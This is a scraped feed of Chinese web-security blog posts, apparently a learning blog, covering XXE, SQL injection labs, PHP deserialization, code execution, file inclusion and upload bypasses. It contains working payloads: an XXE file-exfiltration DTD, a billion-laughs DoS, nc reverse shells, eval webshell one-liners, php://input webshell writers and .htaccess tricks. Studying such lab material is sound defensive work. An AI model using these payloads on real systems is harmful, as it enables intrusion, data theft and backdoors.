&lt;!ENTITY % remote SYSTEM &quot;http://localhost:8000/Blind_XXE/evil.dtd&quot;&gt; &lt;!ENTITY % file SYSTEM &quot;php://filter/convert.base64-encode/resource=d:/test.txt&quot;&gt; %remote; %send; ]&gt; 访问test.php，将payload用post方式传入。调用外部DTD文档evil.dtd，访问XXE_OOB.php，将数据写入xxe.txt文档中。也可以查看access.log获取数据。 数据aGVsbG8h经过Base64编码，解码后为hello! 2.2.2 内网探测2.2.2.1 端口扫描12345&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE ipconfig [&lt;!ENTITY xxe SYSTEM &quot;http://192.168.126.1&quot;&gt;]&gt;&lt;reset&gt;&lt;login&gt;&amp;xxe;&lt;/login&gt;&lt;secret&gt;Any bugs?&lt;/secret&gt;&lt;/reset&gt; 2.3 DOS拒绝服务递归调用，占用大量服务器资源 1234567891011121314&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE DOS [&lt;!ENTITY DOS0 &quot;DOS&quot;&gt;&lt;!ENTITY DOS1 &quot;&amp;DOS0;&amp;DOS0;&amp;DOS0;&amp;DOS0;&amp;DOS0;&amp;DOS0;&quot;&gt;&lt;!ENTITY DOS2 &quot;&amp;DOS1;&amp;DOS1;&amp;DOS1;&amp;DOS1;&amp;DOS1;&amp;DOS1;&quot;&gt;&lt;!ENTITY DOS3 &quot;&amp;DOS2;&amp;DOS2;&amp;DOS2;&amp;DOS2;&amp;DOS2;&amp;DOS2;&quot;&gt;&lt;!ENTITY DOS4 &quot;&amp;DOS3;&amp;DOS3;&amp;DOS3;&amp;DOS3;&amp;DOS3;&amp;DOS3;&quot;&gt;&lt;!ENTITY DOS5 &quot;&amp;DOS4;&amp;DOS4;&amp;DOS4;&amp;DOS4;&amp;DOS4;&amp;DOS4;&quot;&gt;&lt;!ENTITY DOS6 &quot;&amp;DOS5;&amp;DOS5;&amp;DOS5;&amp;DOS5;&amp;DOS5;&amp;DOS5;&quot;&gt;&lt;!ENTITY DOS7 &quot;&amp;DOS6;&amp;DOS6;&amp;DOS6;&amp;DOS6;&amp;DOS6;&amp;DOS6;&quot;&gt;&lt;!ENTITY DOS8 &quot;&amp;DOS7;&amp;DOS7;&amp;DOS7;&amp;DOS7;&amp;DOS7;&amp;DOS7;&quot;&gt;&lt;!ENTITY DOS9 &quot;&amp;DOS8;&amp;DOS8;&amp;DOS8;&amp;DOS8;&amp;DOS8;&amp;DOS8;&quot;&gt;]&gt;&lt;DOS&gt;&amp;DOS9;&lt;/DOS&gt; 2.4 远程代码执行当目标服务器安装了PHP expect模块，并且加载了该模块时，可以使用expect执行系统命令。 12345&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE ipconfig [&lt;!ENTITY xxe SYSTEM &quot;expect://ifconfig&quot;&gt;]&gt;&lt;ipconfig&gt;&amp;xxe;&lt;/ipconfig&gt; 3. XXE防御 The main problem is that the XML parser parses the untrusted data sent by the user. However, it may not be easy or possible to validate only data present within the system identifier in the DTD. Most XML parsers are vulnerable to XML external entity attacks (XXE) by default. Therefore, the best solution would be to configure the XML processor to use a local static DTD and disallow any declared DTD included in the XML document. From:HUNTING IN THE DARK - BLIND XXE XXE的主要问题是XML解析器解析了用户发送的不可信数据。然而，在DTD文档中验证带有系统标识符的数据并不现实。默认情况下，大多数XML解析器都容易遭受XXE攻击。所以，最好的解决办法是配置XML处理器仅使用本地静态DTD，同时禁止XML文档中的DTD声明。 4. 参考[1] XML外部实体（XXE）注入详解 [2] XXE攻击指南 [3] 浅谈XXE漏洞攻击与防御 [4] 黑夜的猎杀-盲打XXE [5] HUNTING IN THE DARK - BLIND XXE [6] XXE漏洞利用技巧：从XML到远程代码执行","categories":[],"tags":[]},{"title":"'Sqli-Lab'","slug":"Sqli-Lab","date":"2019-05-03T01:37:18.000Z","updated":"2019-05-11T03:18:38.429Z","comments":true,"path":"2019/05/03/Sqli-Lab/","link":"","permalink":"https://chirec.github.io/2019/05/03/Sqli-Lab/","excerpt":"Less-01字符型&#39;联合查询Or报错注入 联合查询","text":"Less-01字符型&#39;联合查询Or报错注入 联合查询 报错注入 Less-02数值型联合查询Or报错注入 联合查询 报错注入 Less-03字符型&#39;)联合查询Or报错注入 联合查询 报错注入 Less-04字符型&quot;)联合查询Or报错注入 联合查询 报错注入 Less-05字符型&#39;布尔盲注or报错注入 布尔盲注 报错注入 Less-06字符型&quot;布尔盲注Or报错注入 布尔盲注 报错注入 Less-07字符型&#39; 提示：Use outfile 将查询结果写入version.txt文件，提示报错，但文件已经写入成功 也可以写入一句话 php代码使用&#39;进行包裹，可以防止$被浏览器转义导致无法正常写入 Less-08字符型&#39;没有错误回显，无法报错注入 布尔盲注 Less-09字符型&#39;此关标题为基于时间的盲注在代码里，不管是否正确，都显示相同的输出“You are in………..”所以只能使用延时盲注 Less-10字符型&quot;和Less-09一样，都是基于时间的盲注不同之处在于，使用&quot;进行闭合 Less-11字符型&#39;使用万能密码可以登录 可以使用联合查询进行注入 可以使用报错注入进行查询 Less-12字符型&quot;)同样使用万能密码登陆在构造payload时，使用(&quot;&quot;)进行包裹 同样可以使用联合查询、报错查询 Less-13字符型&#39;)使用万能密码登录无回显 使用布尔盲注 Less-14字符型&quot;和Less-13除了闭合方式不同外，其他均相同 由于有错误提示，可以使用报错注入 Less-15字符型&#39;使用万能密码测试闭合 使用布尔盲注 使用延时盲注 Less-16字符型&quot;)使用万能密码测试闭合 和Less-15除了闭合方式不同外，其他均相同 Less-17字符型&#39; 判断闭合 报错提示 1near &apos;&quot;)&apos; WHERE username=&apos;admin&apos;&apos; 第一个和最后一个&#39;是报错自带的，可以无视在payload里写的是&#39;&quot;)，但在报错提示中，少了一个&#39;，所以唯一的解释是这个单引号和前面的单引号闭合了，所以可以判断是字符型&#39;。在尝试的过程中，uname无法产生报错信息，查看源码发现，uname被各种转义，而passwd并没有被转义，所以在passwd处进行注入。在报错信息中，可以看出uname是由单引号包裹的，按照写代码的习惯，可以推断passwd也是由单引号包裹的，但这种推断并不合理。 报错注入 延时盲注 Less-18HTTP头部-UserAgent注入字符型&#39; 为什么不正常注入呢？因为在代码中，uname和passwd都被转义了为什么要从UserAgent注入呢？因为标题有Uagent这题刚打开只显示IP，只有登录才可以显示UA，但uanme和passwd都被转义了，只能正常登录，从Less-17可以修改密码使用BP抓包对HTTP请求进行修改payload中,&#39;1&#39;=&#39;1是因为在代码中insert添加了3个字段，为了不报错，需要再添加一个字段；但是直接注释掉却会报错，不明白为什么。 显示页面 Less-19HTTP头部-Referer注入字符型&#39; 和Less-18除了注入位置不同之外，其他相同从代码上看，不需要,&#39;1因为已经2个字段了，但不加会报错，不明白为什么，需要再想想。 显示页面 Less-20HTTP头部-Cookie注入字符型&#39; 联合查询 登录之后，对cookie进行修改 显示页面 报错注入 登录之后，对cookie进行修改 显示页面 Less-21HTTP头部-Cookie注入字符型&#39;) 联合查询 登录之后，对cookie进行修改 显示页面 报错注入 登录之后，对cookie进行修改 显示页面 Less-22HTTP头部-Cookie注入字符型&quot; 跟Less-21的区别是需要使用&quot;进行闭合 报错注入 登录之后，对cookie进行修改 显示页面 Less-23","categories":[],"tags":[]},{"title":"'PHP反序列化'","slug":"PHP-Serialize-And-Unserialize","date":"2019-04-25T14:04:57.000Z","updated":"2019-04-28T07:35:18.274Z","comments":true,"path":"2019/04/25/PHP-Serialize-And-Unserialize/","link":"","permalink":"https://chirec.github.io/2019/04/25/PHP-Serialize-And-Unserialize/","excerpt":"1. PHP(反)序列化1.1 序列化将变量转换为可保存或传输的字符串的过程； 1.2 反序列化在适当的时候把这个字符串再转化成原来的变量使用。","text":"1. PHP(反)序列化1.1 序列化将变量转换为可保存或传输的字符串的过程； 1.2 反序列化在适当的时候把这个字符串再转化成原来的变量使用。 这两个过程结合起来，可以轻松地存储和传输数据，使程序更具维护性。常见的php系列化和反系列化方式主要有：serialize，unserialize；json_encode，json_decode。 string serialize ( mixed $value )返回字符串，此字符串包含了表示 value 的字节流，可以存储于任何地方。 mixed unserialize ( string $str )对单一的已序列化的变量进行操作，将其转换回 PHP 的值。 HTTP传输数据方式：XML(XXE)JSON 1.3 序列化后123456789101112&lt;?php class test&#123; public $public='chessur'; protected $protected=126; private $private=1.26; public $boolean=true; public $null=NULL; public $array=array(1,2,3,6); &#125; $chessur =new test; echo serialize($chessur);?&gt; 1O:4:&quot;test&quot;:6:&#123;s:10:&quot;public_var&quot;;s:7:&quot;chessur&quot;;s:16:&quot;0x00*0x00protected_var&quot;;i:126;s:17:&quot;0x00test0x00private_var&quot;;d:1.26;s:11:&quot;boolean_var&quot;;b:1;s:8:&quot;null_var&quot;;N;s:5:&quot;array&quot;;a:4:&#123;i:0;i:1;i:1;i:2;i:2;i:3;i:3;i:6;&#125;&#125; 字母 含义 s 字符串(string) i 整型(integer) b 布尔(boolean) d 双精度(double) N 空(NULL) a 数组(array) 1.4 属性public的属性在序列化时，直接显示属性名protected的属性在序列化时，会在属性名前增加0x00*0x00，其长度会增加3private的属性在序列化时，会在属性名前增加0x00classname0x00，其长度会增加类名长度+2 2. PHP反序列化漏洞2.1 漏洞成因1.用户可输入参数2.对用户输入的参数没有进行过滤，或过滤规则不完善3.参数被危险函数使用 2.1.1 魔术方法12345678910111213141516__construct()，类的构造函数__destruct()，类的析构函数__call()，在对象中调用一个不可访问方法时调用__callStatic()，用静态方式中调用一个不可访问方法时调用__get()，获得一个类的成员变量时调用__set()，设置一个类的成员变量时调用__isset()，当对不可访问属性调用isset()或empty()时调用__unset()，当对不可访问属性调用unset()时被调用。__sleep()，执行serialize()时，先会调用这个函数__wakeup()，执行unserialize()时，先会调用这个函数__toString()，类被当成字符串时的回应方法__invoke()，调用函数的方式调用一个对象时的回应方法__set_state()，调用var_export()导出类时，此静态方法会被调用。__clone()，当对象复制完成时调用__autoload()，尝试加载未定义的类__debugInfo()，打印所需调试信息 __construct()和__destruct()会在对象创建或销毁时自动调用； 在对象serialize()过程中，会检查是否具有__sleep()魔术方法。如果存在该方法，则在序列化前执行该方法。__slepp()方法会清理对象，并应该返回一个数组，数组中包含被序列化的对象的所有属性的名称。如果该方法不返回任何内容，则序列化后的字符串将变为N并提示Notice。__sleep()的预期用途是提交需要挂起的数据或执行类似的清理任务。如果有一个非常大的对象，不需要完全保存其所有属性，该功能将非常有用。 在unserialize()过程中，会检查是否具有__wakeup()魔术方法。如果存在该方法，则在反序列化时执行该方法。__wakeup()魔术方法可以重构对象可能具有的任何资源。__wakeup()预期用途是重新建立在序列化期间可能已丢失的任何数据库连接，并执行其他重新初始化任务。 123456789101112131415161718192021222324252627282930313233343536373839&lt;?php class Test &#123; public $value; function __construct()&#123; echo \"__construct\"; echo \"&lt;br /&gt;\"; &#125; function __destruct()&#123; echo \"__destruct\"; echo \"&lt;br /&gt;\"; &#125; function __wakeup()&#123; echo \"__wakeup\"; echo \"&lt;br /&gt;\"; &#125; function __toString()&#123; echo \"__toString\"; echo \"&lt;br /&gt;\"; return $this-&gt;value; &#125; function setValue($parm)&#123; echo \"setValue\"; echo \"&lt;br /&gt;\"; $this-&gt;value = $parm; &#125; &#125; $test = new Test; $test-&gt;setValue(\"chessur\"); $ser_test = serialize($test); echo $ser_test.\"&lt;br /&gt;\"; $obj = unserialize($ser_test); echo $obj.\"&lt;br /&gt;\";?&gt; 123456789//OUTPUT__constructsetValueO:4:&quot;Test&quot;:1:&#123;s:5:&quot;value&quot;;s:7:&quot;chessur&quot;;&#125;__wakeup__toStringchessur__destruct__destruct __autoloading() 传统的PHP只能unserialize()定义过的类，意味着每个PHP文件都需要包含很多文件，在当前主流的PHP框架中，都采用了__autoloading()自动加载类来完成这项繁重的工作。在简化了工作的同时，页为序列化漏洞造成了便捷。 2.2.2 魔术方法执行顺序__wakeup()&gt;__toString()&gt;__destruct() 3. CTF示例welcome to bugkuctf 12345678910111213141516171819202122232425262728293031323334//index.php&lt;?php $txt = $_GET[\"txt\"]; $file = $_GET[\"file\"]; $password = $_GET[\"password\"]; if(isset($txt)&amp;&amp;(file_get_contents($txt,'r')===\"welcome to the bugkuctf\"))&#123; echo \"hello friend!&lt;br&gt;\"; if(preg_match(\"/flag/\",$file))&#123; echo \"不能现在就给你flag哦\"; exit(); &#125;else&#123; include($file); $password = unserialize($password); echo $password; &#125; &#125;else&#123; echo \"you are not the number of bugku ! \"; &#125; ?&gt; &lt;!-- $user = $_GET[\"txt\"]; $file = $_GET[\"file\"]; $pass = $_GET[\"password\"]; if(isset($user)&amp;&amp;(file_get_contents($user,'r')===\"welcome to the bugkuctf\"))&#123; echo \"hello admin!&lt;br&gt;\"; include($file); //hint.php &#125;else&#123; echo \"you are not admin ! \"; &#125; --&gt; 12345678910111213//hint.php&lt;?php class Flag&#123;//flag.php public $file; public function __tostring()&#123; if(isset($this-&gt;file))&#123; echo file_get_contents($this-&gt;file); echo \"&lt;br&gt;\"; return (\"good\"); &#125; &#125; &#125; ?&gt; 在index.php中，通过右键查看源代码，可以看到提示 123456789101112&lt;!-- $user = $_GET[\"txt\"]; $file = $_GET[\"file\"]; $pass = $_GET[\"password\"]; if(isset($user)&amp;&amp;(file_get_contents($user,'r')===\"welcome to the bugkuctf\"))&#123; echo \"hello admin!&lt;br&gt;\"; include($file); //hint.php &#125;else&#123; echo \"you are not admin ! \"; &#125; --&gt; 当user的值为welcome to the bugkuctf时，会进入下一步判断，这里使用php://inputfile会在可以传入一个文件进行本地包含，提示了包含hint.php，所以直接包含hint.php，包含之后发现页面没有变化，因为里面的内容被解析了，使用php://filter/read=convert.base64-encode/resource=hint.php读取文件，再将内容进行base64解码，可以获得上面的hint.php，再通过伪协议获得index.php的内容，可以看到会对password进行反序列化，再看hint.php中Flag类在被转化为字符串时，可以读取并输出文件内容，所以可以写个Flag类的序列化字符串，让它在echo的时候，输出flag.php中的内容。由于需要Flag类，所以$file需要包含hint.php页面。 构造序列化字符串 1O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125; 4. PHP自身漏洞(CVE-2016-7124)4.1 漏洞介绍触发该漏洞的PHP版本为PHP5小于5.6.25或PHP7小于7.0.10。漏洞可以简要的概括为：当序列化字符串中表示对象个数的值大于真实的属性个数时会跳过__wakeup()的执行。 4.2 Demo1234567891011121314151617181920//demo.php&lt;?phpclass test&#123; var $name = \"chessur\"; function __destruct()&#123; $file = fopen(\"D:\\\\phpStudy\\\\WWW\\\\Blog_Serialize\\\\windy.php\",\"w\"); fputs($file,$this-&gt;name); fclose($file); &#125; function __wakeup() &#123; foreach(get_object_vars($this) as $k =&gt; $v) &#123; $this-&gt;$k = null; &#125; echo \"Waking up...\".\"&lt;br /&gt;\"; &#125;&#125;$test = $_POST['test'];$test_unser = unserialize($test);?&gt; 由于__wakeup()的执行顺序在__destruct()之前，所以__wakeup()会将对象内的所有属性设为NULL，在__destruct()执行时，没有内容会写到文件中。但使用漏洞，可以跳过__wakeup()，直接执行__destruct()，这样可以将属性内容写入文件中。 payload 1test=test=O:4:&quot;test&quot;:2:&#123;s:4:&quot;name&quot;;s:18:&quot;&lt;?php phpinfo();?&gt;&quot;;&#125; 执行后会报错，但是数据会被写入到文件中 5. PHP反序列化漏洞防御1.要严格控制用户输入的参数，坚持用户所输入的信息都是不可靠的原则2.要对于unserialize后的变量内容进行检查，以确定内容没有被污染3.对要使用变量的函数进行检查。 6. 参考[1] PHP反序列化漏洞 [2] 浅谈php反序列化漏洞 [3] php反序列化总结 [4] PHP反序列化漏洞成因及漏洞挖掘技巧与案例","categories":[],"tags":[]},{"title":"'远程代码执行'","slug":"Remote-Code-Execution","date":"2019-04-23T11:59:28.000Z","updated":"2019-04-25T14:14:42.609Z","comments":true,"path":"2019/04/23/Remote-Code-Execution/","link":"","permalink":"https://chirec.github.io/2019/04/23/Remote-Code-Execution/","excerpt":"1. 代码执行和命令执行危害非常大，有些漏洞可以直接GetShell执行命令(代码和系统命令)反弹shell获取系统敏感信息","text":"1. 代码执行和命令执行危害非常大，有些漏洞可以直接GetShell执行命令(代码和系统命令)反弹shell获取系统敏感信息 2.命令执行2.1 原因1.参数可控2.使用了可执行系统命令的函数，system()/exec()/shell_exec()，将用户提交的参数拿来执行，中间传递过程无过滤或过滤不严谨注意：执行的命令是系统命令，Windows或者Linux命令 2.2 分类1.代码层2.第三方组件WordPress中用来处理图片的ImageMagick组件心脏滴血漏洞Java中的命令注入漏洞(struts2/ElasticsearchGroovy等)vBulletin 5.x版本通杀远程代码执行3.系统层MS08-067bash破壳漏洞 2.3 命令执行常用函数system()passthru()exec()shell_exec()popen()proc_open()pcntl_exec注意：通过站点中命令执行漏洞执行命令的权限是：依托于站点(www_data/iis_user/USERS) 2.4 反弹shell123nc -vlp port -e /bin/bashnc ip:portpython -c &apos;import pty;pty.spawn(&quot;/bin/bash&quot;)&apos; 2.5 Windows下同时执行多条命令语法格式 命令格式 含义 command1 &amp; command2 先后执行 Command1和 command2，无论command1执行是否成功 Command1 &amp;&amp; command2 先后执行 Command1和 command2，只有command1执行成功时才执行command2 Command1 \\ \\ Command2 先后执行 Command1和 command2，只有command1执行失败时才执行command2 Command1\\ Command2 是管道符，将command1的执行结果 传递给 command2 2.6 Linux 下同时执行多条命令语法格式 命令格式 含义 command1 ; command2 先后执行 Command1和 command2，无论command1执行是否成功 command1 &amp; command2 先后执行 Command1和 command2，无论command1执行是否成功 Command1 &amp;&amp; Command2 先后执行 Command1和 command2，只有command1执行成功时才执行command2 Command1 \\ \\ Command2 先后执行 Command1和 command2，只有command1执行失败时才执行command2 Command1\\ Command2 是管道符，将command1的执行结果 传递给 command2 3.代码执行当应用在调用一些能将字符串转化成代码的函数时，没有考虑用户是否能够控制这个字符串，将造成代码注入漏洞。 在php中：eval，assert，preg_replace(‘/*/e’,‘\\$ret=“\\1”;’,\\$data)在Java中：eval，execute，executeglobal在Jsp中：jsp中没有php中的eval函数，到那时可以利用反射机制，使用基于反射机制的表达式引擎，如0GNL，SpELl，MVEL等 花括号内可执行可变变量 1&#123;$&#123;phpinfo()&#125;&#125; 两个示例 1234567&lt;?php $data = $_GET[&apos;data&apos;]; eval(&quot;\\$ret = strtolower(\\&quot;$data\\&quot;);&quot;); echo $ret;?&gt;//payload:?data=&#123;$&#123;phpinfo()&#125;&#125;//payload:?data=&quot;);phpinfo();// 1234567&lt;?php $data = $_GET[&apos;data&apos;]; // echo $data; preg_replace(&apos;/&lt;data&gt;(.*)&lt;\\/data&gt;/e&apos;,&apos;$ret = &quot;\\\\1&quot;&apos;,$data); //echo $ret;?&gt;//payload:?data=&lt;data&gt;&#123;$&#123;phpinfo()&#125;&#125;&lt;/data&gt; preg一句话 1preg_replace(&apos;/abc/e&apos;,$_POST[&quot;cmd&quot;],&apos;abcdef&apos;) 3.1代码执行漏洞利用3.1.1 一句话1?data=&#123;$&#123;eval($_POST[&quot;windy&quot;])&#125;&#125; 3.1.2 获取当前路径123?data=&#123;$&#123;eval($_POST[&quot;windy&quot;])&#125;&#125;windy=system(&apos;pwd&apos;)?data=&#123;$&#123;print(getcwd())&#125;&#125; 3.1.3 读文件1?data=&#123;$&#123;exit(var_dump(file_get_contents($_POST[&apos;f&apos;])))&#125;&#125; 3.1.4 写文件1?data=&#123;$&#123;exit(var_dump(file_put_contents($_POST[&apos;f&apos;],$_POST[&apos;d&apos;])))&#125;&#125; 4. 代码执行漏洞防御：1.使用json保存数组，读取数据时不使用eval2.必须使用eval的地方要严格过滤(推荐使用白名单)3.对特殊字符进行转义(addslashes、魔术引号、htmlspecialchars、htmlentities、mysql_real_escape_string等)4.放弃使用preg_replace的e修饰符，使用preg_replace_callback()替换5.若必须使用preg_replace的e修饰符，则必用单引号包裹正则匹配出的对象 5.参考[1] 深入研究preg_replace与代码执行 [2] 慎用preg_replace危险的/e修饰符(一句话后门常用) [3] php伪协议实现命令执行的七种姿势","categories":[],"tags":[]},{"title":"'文件包含总结'","slug":"File-Inclusion","date":"2019-04-22T12:46:11.000Z","updated":"2019-05-14T14:05:30.867Z","comments":true,"path":"2019/04/22/File-Inclusion/","link":"","permalink":"https://chirec.github.io/2019/04/22/File-Inclusion/","excerpt":"1. 文件包含在通过PHP的相应函数（比如include()）引入文件时，由于传入的文件名没有经过合理的校验，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入。","text":"1. 文件包含在通过PHP的相应函数（比如include()）引入文件时，由于传入的文件名没有经过合理的校验，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入。 2. 条件用户能够控制这个动态变量，用户提交的文件名或文件类型没有被过滤或过滤不严谨include()等函数通过动态变量的方式引入需要包含的文件注意：包含过来的文件不管是什么类型的文件，只要文件中有php格式的代码均可被解析 3. 文件包含的四个函数includerequireinclude_once require_once 4. 分类4.1 LFI(LocalFileInclude)能够读取或执行包含本地文件的漏洞，称为本地文件包含漏洞。 条件：无 漏洞危害：读取敏感文件(配置文件、服务器上配置文件)GetShell获取站点源码 配置文件/etc/apache2/sites-enabled/etc/php/7.3/apache2/conf.d/etc/mysql/conf.d 有后缀名限制的文件包含：%00截断 php版本&lt;5.3有前缀限制的文件包含：目录跳转 ../既有头部限制又有尾部限制：目录跳转+%00截断 php版本&lt;5.3 4.2 RFI(RemoteFileInclude)allow_url_fopen 本选项激活允许文件包含函数使用URL形式的fopen的封装协议allow_url_include PHP&gt;=5.2 本选项激活允许访问远端文件，并解析条件：两个参数都打开在php.ini中，allow_url_fopen默认一直是On，而allow_url_include从php5.2之后，就默认为Off。 有后缀名限制的远程文件包含：%00截断 php版本&lt;5.3?截断 #截断 php版本&lt;=5.3 5.PHP伪协议5.1 php://input条件：allow_url_include=on，allow_url_fopen不作要求可以通过 1&lt;?PHP fputs(fopen(&apos;windy.php&apos;,&apos;w&apos;),&apos;&lt;?php eval($_POST[windy])?&gt;&apos;);?&gt; 直接上传WebShell 5.2 php://filter条件：无 读取文件中的内容 123php://filter/read=convert.base64-encode/resource=index.phpphp://filter/convert.base64-encode/resource=index.phpphp://filter/string.str_rot13/resource=index.php 5.3 file://1file://d:/phpstudy/www/webshell.jpg 可以解析 5.4 phar://条件：php版本&gt;=5.3.0info.txt --&gt;打包成zip文件相对路径 1phar://test.zip/phpinfo.txt 可以直接解析zip压缩包文件下的文件 绝对路径 1phar://D:/phpstudy/www/test.zip/phpinfo.txt 5.5 zip://条件：php版本&gt;=5.3.0使用的过程中，只能用绝对路径，在压缩包名后写上%23 5.6 data://条件：php版本&gt;=5.2 allow_url_fopen=On allow_url_include=On利用方式1： 1data://text/plain,&lt;?php phpinfo();?&gt; 利用方式2： 1data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b 图片来源：php伪协议实现命令执行的七种姿势 5.7 伪协议利用5.7.1 获取服务器中session值若可以注册用户名，可以注册带有php代码的用户名，再通过文件包含漏洞包含本地session最终实现RCE命令执行 (/tmp/ 或者 /var/lib/php/ ) login|s:3:&quot;bee&quot;;admin|s:1:&quot;1&quot;;token|s:40:&quot;sessionID&quot; 5.7.2 访问记录文件包含包含/proc/self/environ文件GetShell/proc/self/environ会记录User_Agent使用插件或Burpsuite更改User_Agent条件：php通过CGI去解析、普通用户可读 6. 文件包含防御1.设置白名单2.过滤危险字符3.设置openbasedir4.关闭危险设置(allow_url_fopen&amp;allow_url_include) 7. Tricks这两个姿势是从嘶吼上看到的，文件包含&amp;奇技淫巧。 7.1 phpinfo+LFI 这个trick利用phpinfo会打印上传缓存文件路径的特性，进行缓存文件包含达到getshell的目的。 1.临时文件在phpinfo页面加载完毕后才会被删除。 2.phpinfo页面会将所有数据都打印出来，包括header。 3.php默认的输出缓冲区大小为4096，可以理解为php每次返回4096个字节给socket连接。 7.1.1 竞争流程 1.发送包含了webshell的上传数据包给phpinfo页面，同时在header中塞满垃圾数据。 2.因为phpinfo页面会将所有数据都打印出来，垃圾数据会加大phpinfo加载时间。 3.直接操作原生socket，每次读取4096个字节。只要读取到的字符里包含临时文件名，就立即发送第二个数据包。 4.此时，第一个数据包的socket连接实际上还没结束，因为php还在继续每次输出4096个字节，所以临时文件此时还没有删除。 5.利用这个时间差，在第二个数据包进行文件包含漏洞的利用，即可成功包含临时文件，最终getshell。 7.2 LFI+php7崩溃 利用php7 segment fault特性。 我们可以利用： 12&gt; http://ip/index.php?file=php://filter/string.strip_tags=/etc/passwd&gt; 这样的方式，使php执行过程中出现Segment Fault，这样如果在此同时上传文件，那么临时文件就会被保存在/tmp目录，不会被删除。 8. 参考[1] php伪协议实现命令执行的七种姿势 [2] 文件包含&amp;奇技淫巧 [3] PHP文件包含漏洞（利用phpinfo）","categories":[],"tags":[]},{"title":"'文件上传总结'","slug":"Upload-Files","date":"2019-04-19T11:56:07.000Z","updated":"2019-04-25T12:44:37.369Z","comments":true,"path":"2019/04/19/Upload-Files/","link":"","permalink":"https://chirec.github.io/2019/04/19/Upload-Files/","excerpt":"1. WebShell1.1 什么是ShellShell是系统的用户界面，提供了用户与内核进行交互操作的一种接口。它接收用户输入的命令并把它送入内核去执行。因为系统内核使我们不能直接操作的，shell就给我们提供了一个接口，通过shell我们可以把命令送入到内核。shell管理用户与操作系统之间的交互：等待你输入，向操作系统解释你的输入，并且处理各种各样的操作系统的输出结果。传统意义上的shell指的是命令行式的shell，以后如果不特别注明，shell是指命令行式的shell。表示用户拥有的权限，不同的shell权限不同 1.2 WebShell黑客在入侵了一个网站后，通常会留下一个asp或php后门文件与网站web服务器进行交互，得到一个命令执行环境，以达到控制网站服务器的目的。这个后门文件就是所谓的webshell。","text":"1. WebShell1.1 什么是ShellShell是系统的用户界面，提供了用户与内核进行交互操作的一种接口。它接收用户输入的命令并把它送入内核去执行。因为系统内核使我们不能直接操作的，shell就给我们提供了一个接口，通过shell我们可以把命令送入到内核。shell管理用户与操作系统之间的交互：等待你输入，向操作系统解释你的输入，并且处理各种各样的操作系统的输出结果。传统意义上的shell指的是命令行式的shell，以后如果不特别注明，shell是指命令行式的shell。表示用户拥有的权限，不同的shell权限不同 1.2 WebShell黑客在入侵了一个网站后，通常会留下一个asp或php后门文件与网站web服务器进行交互，得到一个命令执行环境，以达到控制网站服务器的目的。这个后门文件就是所谓的webshell。 2. 木马分类2.1 一句话木马一句话木马是Webshell的一种，由于这类Webshell代码比较少，往往只有一行代码，所以就被称为一句话木马。一句话木马虽然代码简单，但是结合中国菜刀、蚁剑等WebShell管理工具，它们的功能却是非常的强大。 2.1.1 一句话木马工作原理在PHP、ASP、ASPX中都有可以执行外部程序的函数，一句话木马就是通过这些函数来工作的，由页面传输待执行的命令，函数在远程执行命令。 PHP一句话木马1&lt;?php eval($_POST[&apos;cmd&apos;]);?&gt; ASP一句话木马1&lt;% eval request(&apos;cmd&apos;)%&gt; ASPX一句话木马1&lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;cmd&quot;])%&gt; 2.1.2 特点代码量少，体积小，不易被发现，配合WebShell管理工具功能强大。 2.2 小马2.2.1 特点代码量较少，体积较小，基本功能(文件管理、命令执行、数据库管理)都有 2.3 大马2.2.1 特点代码量多，体积大，易被发现，功能多 3. 修改Apache权限WebShell的权限和Apache权限有关，可以通过限制Apache权限降低WebShell的权限。 3.1 Windows为Apache添加用户 1user Apache password /add 打开服务管理 找到Apache-属性-登录-此账户 登录Apache用户 3.2 Linux不使用源码安装Apache就是最低权限 4. 文件上传4.1 文件上传原理在文件上传的功能处，若服务端脚本语言未对上传的文件进行严格验证和过滤，导致恶意用户上传恶意的脚本文件时，就有可能获取执行服务端命令的能力，这就是文件上传漏洞。 文件上传漏洞对Web应用来说是一种非常严重的漏洞。一般情况下，Web应用都会允许用户上传一些文件，如头像、附件等信息，如果Web应用没有对用户上传的文件进行有效的检查过滤，那么恶意用户就会上传一句话木马等Webshell，从而达到控制Web网站的目的。 4.1.1 文件上传漏洞高危触发点相册、头像上传视频、照片分享附件上传文件管理器 4.2 文件上传检测4.2.1 JavaScript检测检测文件后缀名绕过方式：1.关闭JS解析2.在白名单中加上要上传的文件类型3.破坏JS4.拦截数据包修改文件名 upload-labs第1关 4.2.2 MIME检测检测content-type绕过方式：抓包修改content-type image/png image/jpeg image/bmp 4.2.3 扩展名检测4.2.3.1 使用黑名单检测：{php|php3|php4|asp|html|jsp} 4.2.3.2 绕过方式：4.2.3.2.1 找一种不在黑名单中的，可以被正常解析的文件后缀名4.2.3.2.2 后缀名大小写4.2.3.2.3 利用windows特性绕过检测:4.2.3.2.3.1 Windows+PHP 叠加特性(upload-labs第4关)12345&quot; = .\\&gt; = ?\\&lt; = * 第一步操作可以向服务器中写一个0字节的文件 1test.php:.jpg 第二步上传时，修改文件名为test.&gt;&gt;&gt;或test.&lt; 4.2.3.2.3.2 Windows文件名特性(upload-labs第6,7,9关)点或者空格结尾的文件再保存的时候，点和空格会被删除shell.php.(空格)或shell.php&nbsp;(空格) 4.2.3.2.3.3 Windows文件流(NTFS)特性(upload-labs第8关) 4.2.3.2.4 使用00截断 (PHP版本)php版本要小于5.3.4，5.3.4及以上已经修复该问题；magic_quotes_gpc需要为OFF状态，在PHP.ini中修改 4.2.3.2.4.1 path通过GET方式传输(upload-lab第11关)抓包修改URL，在末尾加上可以解析的扩展名和%00进行截断 4.2.3.2.4.2 path通过POST方式传输(upload-lab第12关)抓包-在保存路径后添加可以解析的扩展名并使用%00进行截断，要将%00选中Ctrl+Shift+U转为十六进制。 4.2.3.2.5 通过修改解析规则绕过黑名单检测创建.htaccess文件 123&lt;FilesMatch &quot;test.io&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt; 上传.htaccess文件，再上传test.io，test.io被解析为php 4.2.4 文件内容检测(文件头或魔术头)(upload-labs第13关) 格式 文件头 JPG FF D8 FF 